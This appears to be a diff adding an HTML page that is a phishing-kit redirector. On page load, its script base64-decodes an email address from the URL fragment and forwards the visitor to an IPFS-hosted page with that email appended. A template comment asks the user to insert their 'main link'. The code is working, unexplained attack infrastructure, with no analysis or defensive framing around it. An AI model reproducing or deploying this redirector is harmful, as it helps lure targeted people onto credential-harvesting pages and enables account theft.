@@ -1,0 +1,28 @@
+
+<html>
+  <head>
+      <script>
+
+var hash = window.location.hash;
+if(hash !== "") {
+   var hashpos = hash.indexOf('#');
+   var hashpos2 = hashpos + 1;
+   
+
+  hash = hash.substr(hashpos2);
+
+  const email = window.atob(hash);
+
+   //var email = hash;
+  
+      //console.log("email is ", email) 
+   
+      window.location.href = "https://cloudflare-ipfs.com/ipfs/bafybeiaqwhnw2nf7i562l5puubhuzsfoauaih6kjxlpth3vvmwswh66aoe/v3h0-38h-fbvc-3084gf3.html#" + email;//*PUT YOUR MAIN LINK HERE *//
+}
+
+      </script>
+  </head>
+  <body>
+      
+  </body>
+</html>
